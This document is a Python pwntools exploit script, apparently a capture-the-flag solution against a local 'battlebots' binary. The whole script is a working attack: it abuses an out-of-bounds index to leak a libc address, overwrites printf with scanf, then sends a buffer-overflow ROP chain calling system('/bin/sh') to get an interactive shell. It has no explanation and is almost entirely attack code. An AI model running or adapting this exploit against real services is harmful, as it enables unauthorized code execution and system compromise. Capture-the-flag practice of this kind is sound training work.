from pwn import *


def view(bid):
    r.sendlineafter(b'--> ', b'1')
    r.sendlineafter(b' > ', str(bid).encode())

    r.recvuntil(b': ')
    hp = int(r.recvuntil(b'\n'))
    r.recvuntil(b': ')
    shd = int(r.recvuntil(b'\n'))
    r.recvuntil(b': ')
    atk = int(r.recvuntil(b'\n'))

    return hp, shd, atk

def edit(bid, hp, shd, atk):
    r.sendlineafter(b'--> ', b'2')
    r.sendlineafter(b' > ', str(bid).encode())

    r.sendlineafter(b' > ', str(hp).encode())
    r.sendlineafter(b' > ', str(shd).encode())
    r.sendlineafter(b' > ', str(atk).encode())

def leave_feedback(feedback):
    r.sendlineafter(b'--> ', b'4')
    r.sendlineafter(b' > ', b'n')
    r.sendlineafter(b' > ', feedback.encode())
    r.recvuntil(b'chad id: ')
    fid = r.recvuntil(b'\n').strip()
    return fid



print('[*] connecting')
r = remote('localhost', 55555)
#r = process('./battlebots')

print('[*] leaving feedback')
fid = leave_feedback('amogus')
print(f'[+] fid: {fid}')

print('[*] viewing battlebot -24')
hp, shd, atk = view(2**32 * 2 - 24)
print(f'[+] {hp} {shd} {atk}')

printf = hp.to_bytes(4, byteorder='little', signed=True)
printf += shd.to_bytes(4, byteorder='little', signed=True)[:2]
printf = int.from_bytes(printf[::-1])
print(f'[+] printf: {hex(printf)}')

libc = printf - 0x004621b1
scanf = libc + 0x00462616
print(f'[+] scanf: {hex(scanf)}')

print(f'[*] overwriting printf to scanf')
scanf = p64(scanf)
hp = int.from_bytes(scanf[:4], byteorder='little')
shd = int.from_bytes(scanf[4:], byteorder='little')

print(f'[*] editing battlebot -24 to {hp} {shd} {atk}')
r.sendlineafter(b'--> ', b'2')
r.sendlineafter(b' > ', str(2**32 * 2 - 24).encode())
r.sendlineafter(b' > ', str(hp).encode())
r.sendline(str(shd).encode())
r.sendline(str(atk).encode())


print(f'[*] almost there')
poprdiret = libc + 0x0000000000014413 + 0x400000
binsh = libc + 0x0049ffe1
ret = libc + 0x0000000000014126 + 0x400000
system = libc + 0x0045bb7e
print(f'[*] {hex(poprdiret)} pop rdi; ret;')
print(f'[*] {hex(binsh)} /bin/sh')
print(f'[*] {hex(ret)} ret;')
print(f'[*] {hex(system)} system')


r.sendline(b'4')
r.sendline(b'y')
r.sendline(fid)
r.sendlineafter(b'Chat history:\n', b'amogus')

print('[*] ropping')
r.sendline(b'Z' * cyclic_find(b'waau') + p64(poprdiret) + p64(binsh) + p64(ret) + p64(system))

print('[*] ok lets go')
r.sendline(b'5')
r.sendline(b'5')

r.interactive()
